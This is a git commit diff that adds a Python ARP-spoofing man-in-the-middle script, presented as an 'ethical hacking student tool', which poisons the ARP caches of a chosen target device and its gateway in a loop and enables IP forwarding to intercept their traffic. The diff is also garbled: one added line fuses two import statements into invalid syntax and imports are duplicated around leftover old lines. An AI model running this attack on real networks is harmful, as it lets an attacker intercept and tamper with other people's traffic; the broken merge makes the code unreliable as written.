fd19bf0fc7be5919548b6a11b4aa401fa7bc37f8
yashkhanofficial <info.yashkhan@gmail.com>
2026-03-05 00:44:03 +0300

    Update mitm_pro.py

--- mitm_pro.py
+++ mitm_pro.py
@@ -1,6 +1,63 @@
 import scapy.all as scapy
 from scapy.layers import http
+import timeimport scapy.all as scapy
 import time
+import os
+import sys
+
+# Sundor Banner
+def banner():
+    print("""
+    #########################################
+    #          PRO-MITM TOOL 2026           #
+    #      Ethical Hacking Student Tool     #
+    #########################################
+    """)
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"[-] Could not find MAC for {ip}. Check connection.")
+        sys.exit()
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+if __name__ == "__main__":
+    banner()
+    if os.geteuid() != 0:
+        print("[-] Please run this tool as ROOT (use sudo or tsu)!")
+        sys.exit()
+
+    target_ip = input("[?] Target Device IP: ")
+    gateway_ip = input("[?] Router (Gateway) IP: ")
+
+    try:
+        print("[*] Enabling IP Forwarding...")
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        print("[+] Attack Started. Press Ctrl+C to Stop.")
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[-] Restoring Network and Quitting...")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 import os
 
 # Terminal screen clear korar jonno
